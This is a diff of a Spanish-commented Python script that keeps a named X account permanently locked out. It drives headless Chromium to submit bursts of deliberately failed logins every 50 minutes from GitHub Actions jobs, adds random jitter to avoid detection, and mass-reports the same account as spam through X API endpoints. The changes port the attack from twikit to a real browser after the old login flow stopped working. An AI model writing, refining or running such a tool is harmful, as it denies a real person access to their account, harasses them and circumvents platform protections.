@@ -1,8 +1,8 @@
 """
-Lockout continuo para una cuenta de X.
-Disenado para correr dentro de un job de larga duracion de GitHub Actions.
-Cada job vive MAX_JOB_MINUTOS y repite una rafaga de logins fallidos
-cada INTERVALO_MINUTOS, de forma que la cuenta objetivo no pueda entrar.
+Lockout continuo para una cuenta de X usando un navegador REAL (Playwright).
+X retiro el flujo de login que usaba twikit (LoginRetired), asi que ahora
+hacemos los intentos de login de verdad en Chromium.
+El reporte (opcional) se hace con twikit autenticando por cookies.
 """
 
 import asyncio
@@ -11,48 +11,36 @@ import random
 import time
 from datetime import datetime, timezone
 
+from playwright.async_api import async_playwright
 from twikit import Client
+import pyotp
 
 # ---------------------------- CONFIG ----------------------------
-OBJETIVO            = os.environ.get("OBJETIVO", "elizabethotaval")
-CONTRASENA_FALSA    = os.environ.get("CONTRASENA_FALSA", "noEsLaClave_2026!")
-INTENTOS_POR_RAFAGA = int(os.environ.get("INTENTOS_POR_RAFAGA", "12"))
-PAUSA_ENTRE_INTENTOS = float(os.environ.get("PAUSA_ENTRE_INTENTOS", "2"))
+OBJETIVO = os.environ.get("OBJETIVO", "elizabethotaval")
+CONTRASENA_FALSA = os.environ.get("CONTRASENA_FALSA", "noEsLaClave_2026!")
+INTENTOS_POR_RAFAGA = int(os.environ.get("INTENTOS_POR_RAFAGA", "10"))
+PAUSA_ENTRE_INTENTOS = float(os.environ.get("PAUSA_ENTRE_INTENTOS", "3"))
 
-# Duracion de cada job (GitHub corta a 360 min; 350 deja margen).
-MAX_JOB_MINUTOS  = float(os.environ.get("MAX_JOB_MINUTOS", "350"))
-# Intervalo entre rafagas: 50 min < 1h para que el bloqueo nunca expire.
+MAX_JOB_MINUTOS = float(os.environ.get("MAX_JOB_MINUTOS", "340"))
 INTERVALO_MINUTOS = float(os.environ.get("INTERVALO_MINUTOS", "50"))
-JITTER_SEGUNDOS   = 60  # desfase aleatorio para no ser robotico
+JITTER_SEGUNDOS = 60
 
-# Reportes (opcional): si hay credenciales, reporta al inicio de cada job.
-X_USER = os.environ.get("X_USER")
-X_PASS = os.environ.get("X_PASS")
+X_USER = os.environ.get("X_USER") or None
+X_PASS = os.environ.get("X_PASS") or None
 X_EMAIL = os.environ.get("X_EMAIL") or None
-X_TOTP  = os.environ.get("X_TOTP") or None
+X_TOTP = os.environ.get("X_TOTP") or None
 HACER_REPORTE = bool(X_USER and X_PASS)
+
+LOGIN_URL = "https://x.com/i/flow/login"
+
+SEL_USUARIO = ['input[autocomplete="username"]', 'input[name="text"]', 'input[type="text"]']
+SEL_PASS = ['input[name="password"]', 'input[type="password"]']
+SEL_NEXT = ['button:has-text("Next")', 'button:has-text("Siguiente")',
+            '[data-testid="ocfEnterTextNextButton"]']
+SEL_LOGIN = ['button:has-text("Log in")', 'button:has-text("Iniciar")',
+             '[data-testid="LoginForm_Login_Button"]']
+SEL_CODIGO = ['input[autocomplete="one-time-code"]']
 # ----------------------------------------------------------------
-
-
-def log(msg):
-    ahora = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
-    print(f"[{ahora}] {msg}", flush=True)
-
-
-async def rafaga(objetivo):
-    fallos = ok = 0
-    for i in range(1, INTENTOS_POR_RAFAGA + 1):
-        c = Client("en-US")
-        try:
-            await c.login(auth_info_1=objetivo, password=CONTRASENA_FALSA)
-            ok += 1
-            log(f"  intento {i}/{INTENTOS_POR_RAFAGA}: aceptado (raro)")
-        except Exception as e:
-            fallos += 1
-            log(f"  intento {i}/{INTENTOS_POR_RAFAGA}: fallo ({type(e).__name__})")
-        await asyncio.sleep(PAUSA_ENTRE_INTENTOS)
-    log(f"  rafaga terminada: {fallos} fallos / {ok} aceptados")
-
 
 REPORT_ENDPOINTS = [
     ("https://x.com/i/api/1.1/users/report_spam.json",
@@ -64,23 +52,96 @@ REPORT_ENDPOINTS = [
 ]
 
 
+def log(msg):
+    print(f"[{datetime.now(timezone.utc):%Y-%m-%d %H:%M:%S} UTC] {msg}", flush=True)
+
+
+async def _fill(page, selectores, valor, timeout=5000):
+    for sel in selectores:
+        try:
+            await page.fill(sel, valor, timeout=timeout)
+            return True
+        except Exception:
+            continue
+    return False
+
+
+async def _click(page, selectores, timeout=5000):
+    for sel in selectores:
+        try:
+            await page.click(sel, timeout=timeout)
+            return True
+        except Exception:
+            continue
+    return False
+
+
+async def un_intento(page, usuario, password, totp=None):
+    """Un intento de login real. Con password incorrecta -> intento fallido."""
+    await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=60000)
+    if not await _fill(page, SEL_USUARIO, usuario):
+        raise RuntimeError("no encontre campo de usuario")
+    await _click(page, SEL_NEXT)
+    await page.wait_for_timeout(2500)
+
+    if not await _fill(page, SEL_PASS, password):
+        raise RuntimeError("no encontre campo de password")
+    await _click(page, SEL_LOGIN)
+    await page.wait_for_timeout(4000)
+
+    if totp:
+        try:
+            if await page.locator(SEL_CODIGO[0]).count() > 0:
+                await _fill(page, SEL_CODIGO, pyotp.TOTP(totp).now())
+                await _click(page, SEL_NEXT + SEL_LOGIN)
+                await page.wait_for_timeout(3500)
+        except Exception:
+            pass
+
+
+async def rafaga(usuario, intentos):
+    os.makedirs("debug", exist_ok=True)
+    async with async_playwright() as p:
+        navegador = await p.chromium.launch(headless=True)
+        for i in range(1, intentos + 1):
+            contexto = await navegador.new_context(locale="en-US")
+            pagina = await contexto.new_page()
+            try:
+                await un_intento(pagina, usuario, CONTRASENA_FALSA)
+                log(f"  intento {i}/{intentos}: enviado")
+            except Exception as e:
+                log(f"  intento {i}/{intentos}: error {type(e).__name__}: {e}")
+                try:
+                    await pagina.screenshot(path=f"debug/error_{i}.png")
+                except Exception:
+                    pass
+            finally:
+                await contexto.close()
+            await asyncio.sleep(PAUSA_ENTRE_INTENTOS)
+        await navegador.close()
+
+
+async def cookies_de_login(usuario, password, totp=None):
+    async with async_playwright() as p:
+        navegador = await p.chromium.launch(headless=True)
+        contexto = await navegador.new_context(locale="en-US")
+        pagina = await contexto.new_page()
+        await un_intento(pagina, usuario, password, totp)
+        galletas = await contexto.cookies()
+        await navegador.close()
+    return {c["name"]: c["value"] for c in galletas}
+
+
 async def reportar(objetivo):
-    log("Reportando la cuenta como spam...")
-    c = Client("en-US")
-    try:
-        await c.login(auth_info_1=X_USER, auth_info_2=X_EMAIL,
-                      password=X_PASS, totp_secret=X_TOTP)
-    except Exception as e:
-        log(f"  no se pudo loguear para reportar: {type(e).__name__}: {e}")
-        return
-    try:
-        u = await c.get_user_by_screen_name(objetivo)
-    except Exception as e:
-        log(f"  no se encontro el usuario: {e}")
-        return
+    log("Autenticando en el navegador para poder reportar...")
+    galletas = await cookies_de_login(X_USER, X_PASS, X_TOTP)
+    cliente = Client("en-US")
+    cliente.set_cookies(galletas)
+    u = await cliente.get_user_by_screen_name(objetivo)
+    log(f"  id de @{objetivo} = {u.id}")
     for url, build in REPORT_ENDPOINTS:
         try:
-            r = await c.http.post(url, **build(u.id))
+            r = await cliente.http.post(url, **build(u.id))
             log(f"  {url} -> HTTP {r.status_code}")
             if r.status_code in (200, 201, 204):
                 return
@@ -90,13 +151,13 @@ async def reportar(objetivo):
 
 async def main():
     objetivo = OBJETIVO.strip().lstrip("@")
-    log(f"=== INICIO | objetivo @{objetivo} | job max {MAX_JOB_MINUTOS:.0f} min ===")
+    log(f"=== INICIO | @{objetivo} | job max {MAX_JOB_MINUTOS:.0f} min ===")
 
     if HACER_REPORTE:
         try:
             await reportar(objetivo)
         except Exception as e:
-            log(f"  reporte fallo: {e}")
+            log(f"  reporte fallo: {type(e).__name__}: {e}")
 
     inicio = time.monotonic()
     ciclo = 0
@@ -104,19 +165,18 @@ async def main():
         ciclo += 1
         log(f"--- Rafaga #{ciclo} ---")
         try:
-            await rafaga(objetivo)
+            await rafaga(objetivo, INTENTOS_POR_RAFAGA)
         except Exception as e:
             log(f"  error en rafaga: {type(e).__name__}: {e}")
 
         restante = MAX_JOB_MINUTOS - (time.monotonic() - inicio) / 60
-        if restante <= 1:
+        if restante <= 2:
             break
-        dormir = min(INTERVALO_MINUTOS, restante - 0.5) * 60
-        dormir += random.uniform(0, JITTER_SEGUNDOS)
+        dormir = (min(INTERVALO_MINUTOS, restante - 1) * 60) + random.uniform(0, JITTER_SEGUNDOS)
         log(f"  durmiendo {dormir/60:.1f} min...")
         await asyncio.sleep(dormir)
 
-    log(f"=== FIN | {ciclo} rafagas en {MAX_JOB_MINUTOS:.0f} min ===")
+    log(f"=== FIN | {ciclo} rafagas ===")
 
 
 if __name__ == "__main__":
